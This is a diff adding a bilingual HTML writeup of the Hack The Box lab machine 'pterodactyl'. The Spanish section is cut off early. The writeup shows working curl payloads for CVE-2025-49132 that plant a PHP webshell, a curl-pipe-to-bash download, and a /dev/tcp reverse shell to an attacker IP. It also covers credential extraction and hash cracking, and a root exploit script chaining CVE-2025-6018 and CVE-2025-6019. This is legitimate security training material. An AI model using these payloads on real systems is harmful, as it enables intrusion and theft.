@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pterodactyl | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">pterodactyl</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The attack begins with an nmap scan that uncovers a web server running on port 80 alongside
+                        virtual host enumeration, which reveals both <code>play.pterodactyl.htb</code> and
+                        <code>panel.pterodactyl.htb</code>. The main site exposes a <code>changelog.txt</code> file
+                        disclosing that Pterodactyl Panel v1.11.10 is installed, that PHP-PEAR is enabled, and that a
+                        <code>phpinfo.php</code> debugging page exists. The phpinfo page reveals the exact PEAR
+                        installation path, which turns out to be critical for the initial exploit.</p>
+
+                    <p>The panel is vulnerable to <strong>CVE-2025-49132</strong>, an unauthenticated RCE affecting
+                        Pterodactyl Panel v1.11.10. The vulnerability abuses the <code>pearcmd</code> namespace through
+                        a path traversal in the locale parameter to create a PHP webshell on disk, which is then
+                        triggered via a second request. By injecting a reverse shell payload through this webshell,
+                        initial access is obtained as <code>wwwrun</code>.</p>
+
+                    <p>Once inside, credentials found in the application's <code>.env</code> file give access to
+                        MariaDB, where hashed passwords for both local users are extracted. Cracking the hash for
+                        <code>phileasfogg3</code> yields the plaintext password, and SSH access is established as that
+                        user. A mail message in the user's inbox hints at suspicious <code>udisksd</code> activity,
+                        pointing toward the privilege escalation path.</p>
+
+                    <p>Privilege escalation chains two CVEs. <strong>CVE-2025-6018</strong> exploits a flaw in PAM's
+                        <code>pam_env</code> module: by creating a <code>~/.pam_environment</code> file with
+                        <code>XDG_SEAT=seat0</code> and <code>XDG_VTNR=1</code>, the system is tricked into treating
+                        the SSH session as a local physical login, granting the <code>allow_active</code> Polkit flag.
+                        With that flag active, <strong>CVE-2025-6019</strong> can be exploited: a crafted XFS image
+                        containing a SUID bash binary is transferred to the target, mounted via <code>udisksctl</code>,
+                        and a race condition during a filesystem resize operation allows the image to be mounted
+                        without the usual <code>nosuid</code>/<code>nodev</code> security flags. Executing the SUID
+                        bash from the mounted filesystem yields a root shell.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services on the target:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Nmap scan results showing open ports on the pterodactyl machine" /></p>
+
+                <p>The results show a web server on port 80 and SSH on port 22, among others. I add
+                    <code>pterodactyl.htb</code> to <code>/etc/hosts</code> and navigate to the site.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>The main page presents a Minecraft server landing site:</p>
+
+                <p><img src="./media/image3.png"
+                        alt="Pterodactyl.htb main page showing a Minecraft server website" /></p>
+
+                <p>The page references a subdomain <code>play.pterodactyl.htb</code>, which I also add to
+                    <code>/etc/hosts</code>. Clicking the <strong>Changelogs</strong> link reveals a
+                    <code>changelog.txt</code> file with several interesting disclosures:</p>
+
+                <ul>
+                    <li><strong>Pterodactyl Panel v1.11.10</strong> is installed and served under a subdomain.</li>
+                    <li><strong>PHP-PEAR</strong> has been explicitly enabled for PHP package management.</li>
+                    <li>A temporary <strong>phpinfo()</strong> debugging page has been added.</li>
+                    <li>The stack includes <strong>MariaDB 11.8.3</strong> and <strong>nginx 1.21.5</strong>.</li>
+                </ul>
+
+                <p>Running <code>whatweb</code> against the site confirms the PHP version:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#4ec9b0;">http://pterodactyl.htb/</span> [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[<span style="color:#ce9178;">nginx/1.21.5</span>], IP[10.129.1.225], PHP[<span style="color:#ce9178;">8.4.8</span>], Script, Title[My Minecraft Server], X-Powered-By[PHP/8.4.8], nginx[1.21.5]</code></pre>
+
+                <p>Virtual host fuzzing uncovers a third subdomain:</p>
+
+                <pre><code class="language-plaintext">panel.pterodactyl.htb  Status: 200 [Size: 1897]</code></pre>
+
+                <p>I add it to <code>/etc/hosts</code>. Directory fuzzing with gobuster also confirms the phpinfo page
+                    exists at <code>http://pterodactyl.htb/phpinfo.php</code>. The phpinfo output shows the
+                    <code>include_path</code> directive, which reveals the exact PEAR installation path on this system —
+                    this will be essential for the exploit:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#9cdcfe;">include_path</span>    .:/usr/share/php8:<span style="color:#ce9178;">/usr/share/php/PEAR</span>    .:/usr/share/php8:/usr/share/php/PEAR</code></pre>
+
+                <h2>Pterodactyl Panel — CVE-2025-49132</h2>
+                <p>Navigating to <code>panel.pterodactyl.htb</code> confirms the Pterodactyl Panel interface:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Pterodactyl Panel v1.11.10 login page at panel.pterodactyl.htb" /></p>
+
+                <p>Pterodactyl is an open-source game server management panel (<a
+                        href="https://pterodactyl.io/">https://pterodactyl.io/</a>). Version 1.11.10 is vulnerable to
+                    <a href="https://github.com/advisories/GHSA-24wv-6c99-f843">CVE-2025-49132</a>, a critical
+                    <strong>unauthenticated remote code execution</strong> vulnerability.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability abuses the way Pterodactyl Panel handles locale loading. The panel exposes an
+                    endpoint at <code>/locales/locale.json</code> that accepts a <code>locale</code> parameter for
+                    path-based locale file resolution and a <code>namespace</code> parameter for the JSON key. By
+                    passing <code>pearcmd</code> as the namespace, the request is handled by PHP-PEAR's CLI
+                    configuration infrastructure instead.</p>
+
+                <p>Combined with the <code>+config-create+</code> argument and a path traversal in the
+                    <code>locale</code> parameter, this allows an attacker to write arbitrary PHP content to a file on
+                    disk — effectively creating a webshell. A second request then loads that file by traversing back
+                    to <code>/tmp</code>, triggering code execution.</p>
+
+                <p>A PoC is available at: <a
+                        href="https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py">https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py</a>
+                </p>
+
+                <p>The generic two-step payload structure is:</p>
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://{host}/locales/locale.json?+config-create+&amp;locale=../../../../../usr/local/lib/php&amp;namespace=pearcmd&amp;&lt;?=system('{payload}')?&gt;+/tmp/payload.php"</span>
+
+<span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://{host}/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload"</span></code></pre>
+
+                <p>The first request creates the PHP payload file via the PEAR config mechanism; the second triggers it
+                    by referencing it as a locale file.</p>
+
+                <h3>Adapting the Exploit to This Target</h3>
+                <p>Using the default path <code>/usr/local/lib/php</code> (as shown in the generic PoC) does not work
+                    here — it produces the following benign-looking JSON response with no code execution:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+&amp;locale=../../../../../usr/local/lib/php&amp;namespace=pearcmd&amp;&lt;?=system('id')?&gt;+/tmp/payload.php"</span></code></pre>
+                <pre><code class="language-json">{<span style="color:#ce9178;">"..\/..\/..\/..\/..\/usr\/local\/lib\/php"</span>:{<span style="color:#ce9178;">"pearcmd"</span>:[]}}</code></pre>
+
+                <p>According to the vulnerability documentation, a successful exploitation should return an HTTP 500
+                    error (because the PEAR config write triggers a PHP parse), not a clean JSON response. Since the
+                    phpinfo page revealed that PEAR lives at <code>/usr/share/php/PEAR</code>, I modify the path
+                    accordingly:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('id')?&gt;+/tmp/payload5.php"</span></code></pre>
+
+                <p>This time, PEAR correctly processes the request and returns its configuration output, confirming the
+                    webshell has been written to disk. Triggering it:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload5"</span></code></pre>
+
+                <p>Returns output containing the result of <code>id</code> embedded in the PEAR config blob — RCE
+                    confirmed as <code>wwwrun</code>.</p>
+
+                <h3>Getting a Reverse Shell</h3>
+                <p>Spaces in the shell command cannot be passed as literal spaces or URL-encoded characters in this
+                    context — the URL parameter parsing strips them. The standard workaround is to use the
+                    <code>${IFS}</code> shell internal field separator as a space substitute. I first verify
+                    connectivity with a simple curl-back:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('curl\$\{IFS\}10.10.16.94')?&gt;+/tmp/payload2.php"</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload2"</span></code></pre>
+
+                <p>My HTTP server receives the request, confirming outbound connectivity from the target:</p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.225 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>To deliver the reverse shell cleanly, I host it as the <code>index.html</code> on my Python HTTP
+                    server and pipe it to bash from the target. My <code>index.html</code> contains:</p>
+
+                <pre><code class="language-bash"><span style="color:#c586c0;">bash</span> -c <span style="color:#ce9178;">"bash -i &gt;&amp; /dev/tcp/10.10.16.94/443 0&gt;&amp;1"</span></code></pre>
+
+                <p>I start my Python server on port 80, set up a netcat listener on port 443, and fire the payload:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system('curl\$\{IFS\}10.10.16.94\$\{IFS\}|bash')?&gt;+/tmp/payload3.php"</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">curl</span> <span style="color:#ce9178;">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&amp;namespace=payload3"</span></code></pre>
+
+                <p>The target fetches my shell script and executes it:</p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.225 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.94] from (UNKNOWN) [10.129.1.225] 52228
+bash: cannot set terminal process group (1209): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public></code></pre>
+
+                <p>Initial access obtained as <code>wwwrun</code>.</p>
+
+                <h2>Local Enumeration</h2>
+                <p>Listing <code>/home</code> reveals two user accounts:</p>
+
+                <pre><code class="language-plaintext">drwxr-x--- 1 headmonitor  users  140 Dec 31 17:29 headmonitor
+drwxr-xr-x 1 phileasfogg3 users  156 Dec 31 17:29 phileasfogg3</code></pre>
+
+                <p>Both belong to the <code>users</code> group. The home directory of
+                    <code>phileasfogg3</code> is world-readable, and the user flag resides there.</p>
+
+                <p>The application's <code>.env</code> file at <code>/var/www/pterodactyl/.env</code> leaks database
+                    credentials:</p>
+
+                <pre><code class="language-ini"><span style="color:#9cdcfe;">DB_CONNECTION</span>=<span style="color:#ce9178;">mysql</span>
+<span style="color:#9cdcfe;">DB_HOST</span>=<span style="color:#ce9178;">127.0.0.1</span>
+<span style="color:#9cdcfe;">DB_PORT</span>=<span style="color:#ce9178;">3306</span>
+<span style="color:#9cdcfe;">DB_DATABASE</span>=<span style="color:#ce9178;">panel</span>
+<span style="color:#9cdcfe;">DB_USERNAME</span>=<span style="color:#ce9178;">pterodactyl</span>
+<span style="color:#9cdcfe;">DB_PASSWORD</span>=<span style="color:#ce9178;">PteraPanel</span>
+<span style="color:#9cdcfe;">REDIS_HOST</span>=<span style="color:#ce9178;">127.0.0.1</span>
+<span style="color:#9cdcfe;">REDIS_PASSWORD</span>=<span style="color:#ce9178;">null</span>
+<span style="color:#9cdcfe;">REDIS_PORT</span>=<span style="color:#ce9178;">6379</span></code></pre>
+
+                <p>Connecting to MariaDB with these credentials and querying the <code>panel</code> database:</p>
+
+                <pre><code class="language-sql"><span style="color:#569cd6;">select</span> username, password <span style="color:#569cd6;">from</span> users;</code></pre>
+
+                <pre><code class="language-plaintext">+--------------+--------------------------------------------------------------+
+| username     | password                                                     |
++--------------+--------------------------------------------------------------+
+| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
+| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
++--------------+--------------------------------------------------------------+</code></pre>
+
+                <p>Running these bcrypt hashes through hashcat cracks the password for
+                    <code>phileasfogg3</code>:</p>
+
+                <pre><code class="language-plaintext">$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:<span style="color:#4ec9b0;">!QAZ2wsx</span></code></pre>
+
+                <p>I SSH in as <code>phileasfogg3</code> using this password and check sudo privileges:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">sudo</span> -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for phileasfogg3 on pterodactyl:
+    always_set_home, env_reset,
+    env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME
+    LC_ALL LANGUAGE LINGUAS XDG_SESSION_COOKIE", !insults,
+    secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw
+
+User phileasfogg3 may run the following commands on pterodactyl:
+    (ALL) ALL</code></pre>
+
+                <p>At first glance this looks like unrestricted sudo, but the <code>targetpw</code> directive requires
+                    the password of the <em>target</em> user (i.e., root), not the current user. Without root's
+                    password, this entry is effectively useless.</p>
+
+                <h3>Mail Hint</h3>
+                <p><code>phileasfogg3</code> has a mail message at <code>/var/mail/phileasfogg3</code>:</p>
+
+                <pre><code class="language-plaintext">From: headmonitor &lt;headmonitor@pterodactyl&gt;
+To: All Users &lt;all@pterodactyl&gt;
+Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
+
+Attention all users,
+
+Unusual activity has been observed from the udisks daemon (udisksd).
+No confirmed compromise at this time, but increased vigilance is required.
+
+Do not connect untrusted external media. Review your sessions for suspicious
+activity. Administrators should review udisks and system logs and apply pending
+updates.
+
+Report any signs of compromise immediately to headmonitor@pterodactyl.htb
+
+— HeadMonitor
+System Administrator</code></pre>
+
+                <p>The explicit mention of <code>udisksd</code> is a strong hint toward the privilege escalation
+                    vector. The OS is also relevant:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">cat</span> /etc/os-release</code></pre>
+
+                <pre><code class="language-plaintext">NAME="openSUSE Leap"
+VERSION="15.6"
+ID="opensuse-leap"</code></pre>
+
+                <p>Additionally, noting the <code>PATH</code> for this user — <code>/home/phileasfogg3/bin</code>
+                    appears first, which is worth keeping in mind for any path-based techniques.</p>
+
+                <h2>Privilege Escalation — CVE-2025-6018 + CVE-2025-6019</h2>
+                <p>Investigating vulnerabilities in <code>udisks</code> on openSUSE leads to two chained CVEs documented
+                    at <a
+                        href="https://socprime.com/blog/cve-2025-6018-and-cve-2025-6019-lpe-vulnerabilities/">https://socprime.com/blog/cve-2025-6018-and-cve-2025-6019-lpe-vulnerabilities/</a>:
+                </p>
+
+                <ul>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-6018">CVE-2025-6018</a> — PAM
+                        <code>pam_env</code> local privilege escalation via <code>~/.pam_environment</code></li>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-6019">CVE-2025-6019</a> — Polkit
+                        <code>allow_active</code> udisks mount race condition exploit</li>
+                </ul>
+
+                <h3>CVE-2025-6018 — Faking Physical Presence via PAM</h3>
+                <p>Certain Polkit actions, including the ability to mount filesystems via <code>udisks</code>, are
+                    gated behind the <code>allow_active</code> flag. This flag is normally only granted to users who
+                    are physically present at the machine (i.e., on a local TTY), not SSH sessions.</p>
+
+                <p>CVE-2025-6018 exploits a flaw in PAM's <code>pam_env</code> module: it trusts the user's own
+                    environment file (<code>~/.pam_environment</code>) without sufficient validation. By creating
+                    this file with the following content, the system is tricked into believing the SSH session
+                    is a physical local login:</p>
+
+                <pre><code class="language-ini"><span style="color:#9cdcfe;">XDG_SEAT</span>=<span style="color:#ce9178;">seat0</span>
+<span style="color:#9cdcfe;">XDG_VTNR</span>=<span style="color:#ce9178;">1</span></code></pre>
+
+                <p><code>XDG_SEAT=seat0</code> identifies a physical seat, and <code>XDG_VTNR=1</code> assigns a
+                    virtual terminal number — both are conditions that Polkit checks to determine whether a session
+                    is considered "active" in the local sense. With these variables set, re-authenticating (e.g.,
+                    via a new SSH login or <code>su</code>) causes PAM to load them and grant the
+                    <code>allow_active</code> permission to the session.</p>
+
+                <h3>CVE-2025-6019 — udisks Mount Race Condition (SUID Exploit)</h3>
+                <p>With the <code>allow_active</code> flag active, <code>udisks</code> permits the user to mount
+                    filesystems. Normally, user-mounted filesystems are mounted with <code>nosuid</code> and
+                    <code>nodev</code> flags, which prevent SUID binaries from being effective.</p>
+
+                <p>CVE-2025-6019 exploits a race condition during a filesystem resize operation: when a resize is
+                    triggered through the D-Bus interface (<code>org.freedesktop.UDisks2.Filesystem.Resize</code>),
+                    there is a brief window where the filesystem is remounted <em>without</em> the security flags.
+                    If a SUID binary is present on that filesystem and executed during this window, it runs with
+                    elevated privileges.</p>
+
+                <p>The exploitation flow is:</p>
+                <ol>
+                    <li>Create an XFS image on the attacker machine containing a SUID bash binary.</li>
+                    <li>Transfer the image to the target.</li>
+                    <li>Mount the image as a loop device via <code>udisksctl loop-setup</code>.</li>
+                    <li>Keep the filesystem "busy" in the background to prevent automatic unmounting.</li>
+                    <li>Trigger a filesystem resize via <code>gdbus call</code> to the UDisks2 interface — this
+                        causes the race condition.</li>
+                    <li>Locate the SUID bash in <code>/tmp/blockdev*/bash</code> and execute it with
+                        <code>-p</code> to preserve the effective UID.</li>
+                </ol>
+
+                <h3>Preparing the XFS Image</h3>
+                <p>On the attacker machine, I create an XFS filesystem image with a SUID bash binary embedded:</p>
+
+                <pre><code class="language-bash"><span style="color:#569cd6;">dd</span> if=/dev/zero of=xfs.image bs=1M count=300
+<span style="color:#569cd6;">mkfs.xfs</span> -f xfs.image
+<span style="color:#569cd6;">mount</span> xfs.image /mnt
+<span style="color:#569cd6;">cp</span> /bin/bash /mnt/bash
+<span style="color:#569cd6;">chmod</span> 4755 /mnt/bash
+<span style="color:#569cd6;">umount</span> /mnt</code></pre>
+
+                <p>I then serve it with a Python HTTP server and download it on the target with
+                    <code>wget</code> or <code>curl</code>.</p>
+
+                <h3>Applying CVE-2025-6018 and Running the Exploit</h3>
+                <p>First, I create the <code>~/.pam_environment</code> file as <code>phileasfogg3</code> and
+                    re-login via SSH so the PAM variables are loaded into the session. With the
+                    <code>allow_active</code> permission now in effect, I run the exploit script adapted from the
+                    PoC at <a
+                        href="https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh">https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh</a>.
+                    The relevant exploit logic is:</p>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;"># Set up loop device</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Setting up loop device..."</span>
+<span style="color:#9cdcfe;">LOOP_DEV</span>=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction | grep -o <span style="color:#ce9178;">'/dev/loop[0-9]*'</span>)
+
+<span style="color:#c586c0;">if</span> [ -z <span style="color:#ce9178;">"$LOOP_DEV"</span> ]; then
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: Failed to set up loop device."</span>
+    <span style="color:#c586c0;">exit</span> 1
+<span style="color:#c586c0;">fi</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Loop device configured: $LOOP_DEV"</span>
+
+<span style="color:#6a9955;"># Keep filesystem busy to prevent unmounting</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Keeping filesystem busy to prevent unmounting..."</span>
+<span style="color:#c586c0;">while</span> true; do /tmp/blockdev*/bash -c <span style="color:#ce9178;">'sleep 10; ls -l /tmp/blockdev*/bash'</span> &amp;&amp; <span style="color:#c586c0;">break</span>; done 2>/dev/null &amp;
+<span style="color:#9cdcfe;">LOOP_PID</span>=$!
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Background loop started (PID: $LOOP_PID)"</span>
+
+<span style="color:#6a9955;"># Resize filesystem to trigger mount (race condition)</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Resizing filesystem to trigger mount..."</span>
+<span style="color:#c586c0;">for</span> i in {1..3}; do
+    gdbus call --system --dest org.freedesktop.UDisks2 \
+        --object-path <span style="color:#ce9178;">"/org/freedesktop/UDisks2/block_devices/${LOOP_DEV##*/}"</span> \
+        --method org.freedesktop.UDisks2.Filesystem.Resize 0 <span style="color:#ce9178;">'{}'</span> > gdbus_output.txt 2>&amp;1
+
+    <span style="color:#c586c0;">if</span> grep -q <span style="color:#ce9178;">"Error resizing filesystem"</span> gdbus_output.txt; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] Mount successful (expected error: target is busy)."</span>
+        <span style="color:#c586c0;">break</span>
+    <span style="color:#c586c0;">fi</span>
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Attempt $i: Unexpected response, retrying in 1 second..."</span>
+    <span style="color:#c586c0;">sleep</span> 1
+
+    <span style="color:#c586c0;">if</span> [ $i -eq 3 ]; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: Failed to resize filesystem after 3 attempts."</span>
+        kill $LOOP_PID 2>/dev/null
+        udisksctl loop-delete --block-device <span style="color:#ce9178;">"$LOOP_DEV"</span> 2>/dev/null
+        rm -f gdbus_output.txt
+        <span style="color:#c586c0;">exit</span> 1
+    <span style="color:#c586c0;">fi</span>
+<span style="color:#c586c0;">done</span>
+
+<span style="color:#6a9955;"># Wait for mount to stabilize</span>
+<span style="color:#c586c0;">sleep</span> 2
+
+<span style="color:#6a9955;"># Find the SUID bash</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Checking for SUID bash in /tmp/blockdev*..."</span>
+<span style="color:#9cdcfe;">SUID_BASH</span>=<span style="color:#ce9178;">""</span>
+<span style="color:#c586c0;">for</span> i in {1..5}; do
+    <span style="color:#9cdcfe;">SUID_BASH</span>=$(find /tmp -maxdepth 2 -path <span style="color:#ce9178;">"/tmp/blockdev*/bash"</span> -perm -4000 -type f 2>/dev/null)
+    <span style="color:#c586c0;">if</span> [ -n <span style="color:#ce9178;">"$SUID_BASH"</span> ]; then
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[+] SUID bash found: $SUID_BASH"</span>
+        ls -l <span style="color:#ce9178;">"$SUID_BASH"</span>
+        <span style="color:#c586c0;">break</span>
+    <span style="color:#c586c0;">fi</span>
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Attempt $i: SUID bash not found, retrying..."</span>
+    <span style="color:#c586c0;">sleep</span> 1
+<span style="color:#c586c0;">done</span>
+
+<span style="color:#c586c0;">if</span> [ -z <span style="color:#ce9178;">"$SUID_BASH"</span> ]; then
+    <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[-] Error: SUID bash not found after 5 attempts."</span>
+    kill $LOOP_PID 2>/dev/null
+    udisksctl loop-delete --block-device <span style="color:#ce9178;">"$LOOP_DEV"</span> 2>/dev/null
+    rm -f gdbus_output.txt
+    <span style="color:#c586c0;">exit</span> 1
+<span style="color:#c586c0;">fi</span>
+
+<span style="color:#6a9955;"># Execute the SUID shell</span>
+<span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"[*] Executing root shell..."</span>
+<span style="color:#ce9178;">"$SUID_BASH"</span> -p</code></pre>
+
+                <p>Running the exploit produces the following output and drops into a root shell:</p>
+
+                <pre><code class="language-plaintext">[*] Setting up loop device...
+[+] Loop device configured: /dev/loop0
+[*] Keeping filesystem busy to prevent unmounting...
+[+] Background loop started (PID: 16800)
+[*] Resizing filesystem to trigger mount...
+[+] Mount successful (expected error: target is busy).
+[*] Waiting 2 seconds for mount to stabilize...
+[*] Checking for SUID bash in /tmp/blockdev*...
+[+] SUID bash found: /tmp/blockdev.MKY3J3/bash
+-rwsr-xr-x 1 root root 1380656 Feb  8 20:57 /tmp/blockdev.MKY3J3/bash
+[*] Executing root shell...
+bash-5.3#</code></pre>
+
+                <p>Root shell obtained. The root flag is retrievable from <code>/root/root.txt</code>.</p>
+            </div>
+
+            <!-- ========== ESPAÑOL ========== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El ataque comienza con un escaneo de nmap que descubre un servidor web en el puerto 80, junto
+                        con enumeración de virtual hosts que revela tanto <code>play.pterodactyl.htb</code> como
+                        <code>panel.pterodactyl.htb</code>. El sitio principal expone un fichero
+                        <code>changelog.txt</code> que divulga que está instalado Pterodactyl Panel v1.11.10, que
+                        PHP-PEAR está habilitado y que existe una página de depuración <code>phpinfo.php</code>. Dicha
+                        página revela la ruta exacta de instalación de PEAR en el sistema, lo que resulta crítico
+                        para el exploit inicial.</p>
+
+                    <p>El panel es vulnerable a <strong>CVE-2025-49132</strong>, un RCE sin autenticación que afecta a
+                        Pterodactyl Panel v1.11.10. La vulnerabilidad abusa del namespace <code>pearcmd</code> mediante
+                        un path traversal en el parámetro de locale para crear un webshell PHP en disco, que después se
+                        activa con una segunda petición. Inyectando un payload de reverse shell a través de este
+                        webshell, se obtiene acceso inicial como <code>wwwrun</code>.</p>
+
+                    <p>Una vez dentro, las credenciales encontradas en el fichero <code>.env</code> de la aplicación
+                        permiten acceder a MariaDB, donde se extraen las contraseñas hasheadas de ambos usuarios
+                        locales. Crackeando el hash de <code>phileasfogg3</code> se obtiene la contraseña en texto
+                        claro y se establece acceso SSH como ese usuario. Un correo en el buzón del usuario apunta a
+                        actividad sospechosa en <code>udisksd</code>, señalando el vector de escalada.</p>
+
+                    <p>La escalada de privilegios encadena dos CVEs. <strong>CVE-2025-6018</strong> explota un fallo
+                        en el módulo <code>pam_env</code> de PAM: creando un fichero <code>~/.pam_environment</code>
+                        con <code>XDG_SEAT=seat0</code> y <code>XDG_VTNR=1</code>, se engaña al sistema para que
+                        trate la sesión SSH como un inicio de sesión físico local, otorgando el flag
+                        <code>allow_active</code> de Polkit. Con ese flag activo, se explota
+                        <strong>CVE-2025-6019</strong>: una imagen XFS con un binario bash SUID se transfiere al
+                        objetivo, se monta mediante <code>udisksctl</code> y una race condition durante una operación
+                        de redimensionado del sistema de archivos permite montar la imagen sin los flags de seguridad
+                        habituales <code>nosuid</code>/<code>nodev</code>. Ejecutar la bash SUID desde el sistema de
+                        archivos montado proporciona una shell de root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución sobre
+                    el objetivo:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Resultados del escaneo nmap mostrando los puertos abiertos en la máquina pterodactyl" /></p>
+
+                <p>Los resultados muestran un servidor web en el puerto 80 y SSH en el puerto 22, entre otros. Añado
+                    <code>pterodactyl.htb</code> al <code>/etc/hosts</code> y navego al sitio.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>La página principal presenta una landing de servidor de Minecraft:</p>
+
+                <p><img src="./media/image3.png"
+                        alt="Página principal de pterodactyl.htb mostrando el sitio web del servidor de Minecraft" /></p>
+
+                <p>La página referencia un subdominio <code>play.pterodactyl.htb</code>, que también añado al
+                    <code>/etc/hosts</code>. Al hacer clic en el enlace <strong>Changelogs</strong> se accede a un
+                    fichero <code>changelog.txt</code> con varios datos interesantes:</p>
+
+                <ul>
